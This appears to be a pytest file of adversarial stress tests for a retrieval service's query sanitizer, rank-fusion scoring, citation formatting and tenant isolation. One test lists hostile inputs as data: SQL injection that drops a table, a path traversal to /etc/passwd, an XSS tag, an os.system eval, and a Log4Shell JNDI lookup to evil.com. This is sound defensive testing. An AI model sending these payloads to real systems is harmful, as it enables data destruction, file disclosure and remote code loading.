"""Tier 5 Adversarial Stress Tests: Milestone M4 Hybrid Retrieval Pipeline & RRF Blending.

Empirically stress-tests:
1. SQL injection & PostgreSQL tsquery lexical search sanitization attack vectors.
2. Extreme query lengths (10,000+ characters), Unicode homoglyphs, emojis, zero-width chars.
3. Degenerate RRF rank blending conditions:
   - Empty candidate lists, single-source lists, disjoint sets, identical ranking.
   - Extreme k values (k=0, k<0, k=1,000,000).
   - Degenerate weights (weight=0.0, negative weights, massive weights).
   - Intra-list and cross-list deduplication.
   - Normalized relevancy score mathematical bounds [0.0..1.0].
4. Context attribution formatting and citation provenance under corrupt/missing metadata.
5. Workspace scoping and global inheritance under adversarial multi-tenant queries.
"""

from __future__ import annotations

import math
from typing import Any, Dict, List, Optional
from uuid import UUID, uuid4

import pytest

from src.gateway.application.ports.clients import IEmbeddingClient
from src.gateway.application.ports.repositories import (
    IDocumentRepository,
    IKnowledgeRepository,
)
from src.gateway.application.services.retrieval_service import RetrievalService
from src.gateway.application.services.rrf import (
    DEFAULT_RRF_K,
    compute_rrf,
    format_citation,
    format_context_attribution,
    sanitize_tsquery,
)
from src.gateway.domain.canonical import BlendedSearchResult, RankedSearchResult
from src.gateway.domain.entities import DocumentChunk, DocumentFile


# ==============================================================================
# Helper Mock Repositories for Retrieval Stress
# ==============================================================================

class MockRetrievalKnowledgeRepo(IKnowledgeRepository):
    def __init__(self, items: Optional[List[RankedSearchResult]] = None) -> None:
        self.items = items or []

    async def create_item(self, item, initial_revision):
        raise NotImplementedError

    async def get_item_by_id(self, item_id, version=None, workspace_id=None):
        return None

    async def update_item_occ(self, item_id, expected_version, new_revision, **kwargs):
        raise NotImplementedError

    async def soft_delete_item(self, item_id, expected_version=None, workspace_id=None):
        return True

    async def list_revisions(self, item_id):
        return []

    async def search_fts(self, query: str, workspace_id: str = "global", limit: int = 20) -> List[RankedSearchResult]:
        return [
            item for item in self.items
            if item.workspace_id == workspace_id or item.workspace_id == "global" or item.is_global
        ][:limit]

    async def search_vector(self, query_vector: List[float], workspace_id: str = "global", limit: int = 20) -> List[RankedSearchResult]:
        return [
            item for item in self.items
            if item.workspace_id == workspace_id or item.workspace_id == "global" or item.is_global
        ][:limit]


class MockRetrievalDocumentRepo(IDocumentRepository):
    def __init__(self, items: Optional[List[RankedSearchResult]] = None) -> None:
        self.items = items or []

    async def save_document(self, document: DocumentFile) -> DocumentFile:
        return document

    async def get_by_hash(self, workspace_id: str, content_hash: str) -> Optional[DocumentFile]:
        return None

    async def get_by_id(self, document_id: UUID) -> Optional[DocumentFile]:
        return None

    async def save_chunks_batch(self, chunks: List[DocumentChunk]) -> int:
        return len(chunks)

    async def get_chunks_by_document(self, document_id: UUID) -> List[DocumentChunk]:
        return []

    async def search_chunks_fts(self, query: str, workspace_id: str = "global", limit: int = 20) -> List[RankedSearchResult]:
        return [
            item for item in self.items
            if item.workspace_id == workspace_id or item.workspace_id == "global" or item.is_global
        ][:limit]

    async def search_chunks_vector(self, query_vector: List[float], workspace_id: str = "global", limit: int = 20) -> List[RankedSearchResult]:
        return [
            item for item in self.items
            if item.workspace_id == workspace_id or item.workspace_id == "global" or item.is_global
        ][:limit]


class MockEmbeddingClientStub(IEmbeddingClient):
    @property
    def dimension(self) -> int:
        return 768

    async def embed_texts(self, texts: List[str]) -> List[List[float]]:
        return [[0.1] * 768 for _ in texts]

    async def embed_query(self, query: str) -> List[float]:
        return [0.1] * 768


# ==============================================================================
# 1. TSQUERY SANITIZATION & INJECTION ATTACK VECTORS
# ==============================================================================

@pytest.mark.tier5
class TestTsquerySanitizationAdversarial:
    """Stress-tests query sanitization for PostgreSQL FTS tsquery against hostile payloads."""

    @pytest.mark.parametrize(
        "hostile_payload",
        [
            "'; DROP TABLE knowledge_items; --",
            "admin' OR '1'='1",
            "! | & ( ) : * ' \" ; -",
            "&& || !! :: ** -- '' \"\"",
            "!&|():*'\";-!&|():*'\";-",
            "   \t\n\r   ",
            "",
            "   ",
            "SELECT * FROM users WHERE 'a'='a'",
            "eval(compile('import os; os.system(\"calc\")', '', 'exec'))",
            "../../../etc/passwd",
            "<script>alert(1)</script>",
            "${jndi:ldap://evil.com/x}",
            "{{7*7}}",
            "\x00\x01\x02\x03\x04\x05\x06\x07",
            "query with \ufeff BOM and \u200b zero-width space",
        ],
    )
    def test_hostile_sql_and_operator_payloads_sanitized_safely(self, hostile_payload: str):
        """Verify all hostile syntax characters are stripped without raising unhandled exceptions."""
        result = sanitize_tsquery(hostile_payload)
        assert isinstance(result, str)
        if result:
            tokens = result.split(" & ")
            assert len(tokens) >= 1
            for tok in tokens:
                assert tok.strip() == tok
                assert len(tok) > 0

    def test_extreme_query_length(self):
        """Stress: 10,000 word query string sanitization."""
        words = ["searchword" + str(i) for i in range(10000)]
        huge_query = " ".join(words)
        sanitized = sanitize_tsquery(huge_query)
        assert len(sanitized) > 50000
        assert " & " in sanitized

    def test_unicode_and_multilingual_sanitization(self):
        """Verify Unicode, CJK, Arabic, Cyrillic tokens are preserved during sanitization."""
        multilingual = "Python 知识库 検索 búsqueda поиск 🚀"
        sanitized = sanitize_tsquery(multilingual)
        assert "Python" in sanitized
        assert "知识库" in sanitized
        assert "検索" in sanitized
        assert "búsqueda" in sanitized
        assert "поиск" in sanitized


# ==============================================================================
# 2. DEGENERATE RRF BLENDING & MATHEMATICAL BOUNDS
# ==============================================================================

@pytest.mark.tier5
class TestAdversarialRRFBlending:
    """Stress-tests Reciprocal Rank Fusion under degenerate ranking distributions."""

    def _make_item(self, doc_id: str, title: str, score: float, rank: int = 1, source: str = "knowledge") -> RankedSearchResult:
        return RankedSearchResult(
            id=doc_id,
            source_type="knowledge" if source == "knowledge" else "document_chunk",
            title=title,
            content=f"Content for {title}",
            rank=rank,
            raw_score=score,
            workspace_id="ws_test",
            version=1,
        )

    def test_both_candidate_lists_empty(self):
        """Degenerate: FTS and Vector lists are both completely empty."""
        fused = compute_rrf(ranked_lists=[[], []], limit=10)
        assert fused == []

    def test_single_modality_empty_other_full(self):
        """Degenerate: FTS empty, Vector has 5 results."""
        v_items = [self._make_item(f"doc_{i}", f"Doc {i}", 0.9 - i * 0.1, rank=i+1, source="document_chunk") for i in range(5)]
        fused = compute_rrf(ranked_lists=[[], v_items], limit=10)
        assert len(fused) == 5
        assert fused[0].id == "doc_0"
        assert fused[0].vector_rank == 1
        assert fused[0].fts_rank is None
        assert 0.0 <= fused[0].normalized_score <= 1.0

    def test_duplicate_items_within_single_list_deduplicated(self):
        """Degenerate: Upstream returns the same doc_id multiple times in a single list."""
        dup_items = [
            self._make_item("doc_duplicate", "Duplicate Doc", 0.95, rank=1),
            self._make_item("doc_duplicate", "Duplicate Doc", 0.85, rank=2),
            self._make_item("doc_duplicate", "Duplicate Doc", 0.75, rank=3),
            self._make_item("doc_unique", "Unique Doc", 0.70, rank=4),
        ]
        fused = compute_rrf(ranked_lists=[dup_items], limit=10)
        assert len(fused) == 2
        assert fused[0].id == "doc_duplicate"
        assert fused[1].id == "doc_unique"

    def test_extreme_k_values_boundary(self):
        """Verify behavior with k=0, k<0, and k=1,000,000."""
        items = [self._make_item(f"doc_{i}", f"Doc {i}", 1.0 - i * 0.1, rank=i+1) for i in range(3)]

        # k=0 falls back to DEFAULT_RRF_K (60)
        fused_zero = compute_rrf(ranked_lists=[items], rrf_k=0)
        assert len(fused_zero) == 3
        expected_top_score = 1.0 / (DEFAULT_RRF_K + 1)
        assert math.isclose(fused_zero[0].rrf_score, round(expected_top_score, 6), rel_tol=1e-3)

        # k<0 falls back to DEFAULT_RRF_K (60)
        fused_neg = compute_rrf(ranked_lists=[items], rrf_k=-100)
        assert len(fused_neg) == 3
        assert math.isclose(fused_neg[0].rrf_score, round(expected_top_score, 6), rel_tol=1e-3)

        # Massive k (1,000,000)
        fused_huge = compute_rrf(ranked_lists=[items], rrf_k=1_000_000)
        assert len(fused_huge) == 3
        assert fused_huge[0].rrf_score > 0.0
        assert 0.0 <= fused_huge[0].normalized_score <= 1.0

    def test_score_normalization_always_bounded_0_to_1(self):
        """Empirically verify normalized_score is strictly in [0.0, 1.0] across diverse configurations."""
        import random
        random.seed(42)

        for _ in range(50):
            n_lists = random.randint(1, 4)
            ranked_lists = []
            for _ in range(n_lists):
                list_len = random.randint(0, 20)
                r_list = [
                    self._make_item(f"doc_{random.randint(1, 30)}", f"Title {i}", random.random(), rank=i+1)
                    for i in range(list_len)
                ]
                ranked_lists.append(r_list)

            weights = [random.uniform(0.1, 5.0) for _ in range(n_lists)]
            k_val = random.randint(1, 100)
            limit_val = random.randint(1, 50)

            fused = compute_rrf(ranked_lists, weights=weights, rrf_k=k_val, limit=limit_val)
            for item in fused:
                assert 0.0 <= item.normalized_score <= 1.0, f"Score out of bounds: {item.normalized_score}"
                assert item.rrf_score > 0.0


# ==============================================================================
# 3. CONTEXT ATTRIBUTION & PROVENANCE CITATION STRESS
# ==============================================================================

@pytest.mark.tier5
class TestAdversarialContextAttribution:
    """Stress-tests citation generation with missing, None, and truncated text."""

    def test_citation_formatting_with_metadata(self):
        """Verify format_citation and format_context_attribution format properly."""
        item = BlendedSearchResult(
            id="test-id",
            title="Design Patterns",
            content="Some body text explaining factory pattern.",
            rrf_score=0.016,
            normalized_score=0.85,
            source_type="knowledge",
            workspace_id="global",
            version=1,
        )
        citation = format_citation(item)
        assert "[Source: Design Patterns" in citation
        assert "Score: 0.85" in citation
        assert "Revision: v1" in citation

    def test_format_context_attribution_snippet_truncation(self):
        """Verify long content is cleanly truncated to max_snippet_len."""
        long_content = "Word " * 200  # 1000 chars
        item = BlendedSearchResult(
            id="doc_long",
            title="Long Document",
            content=long_content,
            rrf_score=0.03,
            normalized_score=0.9,
            source_type="document_chunk",
            workspace_id="ws_main",
            version=1,
        )
        text_output = format_context_attribution([item], max_snippet_len=100)
        assert "Long Document" in text_output
        assert "... [truncated]" in text_output
        assert len(text_output) < 300


# ==============================================================================
# 4. END-TO-END HYBRID RETRIEVAL SERVICE ADVERSARIAL INTEGRATION
# ==============================================================================

@pytest.mark.tier5
@pytest.mark.asyncio
class TestAdversarialRetrievalService:
    """Stress-tests RetrievalService.hybrid_search with multi-tenant workspace isolation."""

    async def test_hybrid_search_empty_database_returns_empty_gracefully(self):
        """Verify hybrid search on empty repositories returns [] without exception."""
        k_repo = MockRetrievalKnowledgeRepo([])
        d_repo = MockRetrievalDocumentRepo([])
        emb_client = MockEmbeddingClientStub()

        service = RetrievalService(knowledge_repo=k_repo, document_repo=d_repo, embedding_client=emb_client)

        results = await service.hybrid_search(
            query="test query",
            workspace_id="global",
            limit=10,
        )
        assert results == []

    async def test_workspace_isolation_and_global_inheritance(self):
        """Verify hybrid search returns workspace items + global items, but strictly filters other workspaces."""
        k_items = [
            RankedSearchResult(
                id="k_alpha",
                title="Alpha Knowledge",
                content="Alpha content",
                rank=1,
                raw_score=0.9,
                source_type="knowledge",
                workspace_id="ws_alpha",
                version=1,
            ),
            RankedSearchResult(
                id="k_beta",
                title="Beta Knowledge",
                content="Beta content",
                rank=1,
                raw_score=0.9,
                source_type="knowledge",
                workspace_id="ws_beta",
                version=1,
            ),
            RankedSearchResult(
                id="k_global",
                title="Global Knowledge",
                content="Global content",
                rank=2,
                raw_score=0.8,
                source_type="knowledge",
                workspace_id="global",
                is_global=True,
                version=1,
            ),
        ]
        k_repo = MockRetrievalKnowledgeRepo(k_items)
        d_repo = MockRetrievalDocumentRepo([])
        emb_client = MockEmbeddingClientStub()

        service = RetrievalService(knowledge_repo=k_repo, document_repo=d_repo, embedding_client=emb_client)

        # Query ws_alpha -> should see k_alpha and k_global, but NOT k_beta
        results_alpha = await service.hybrid_search(
            query="Knowledge",
            workspace_id="ws_alpha",
            limit=10,
        )
        result_ids = [r.id for r in results_alpha]
        assert "k_alpha" in result_ids
        assert "k_global" in result_ids
        assert "k_beta" not in result_ids
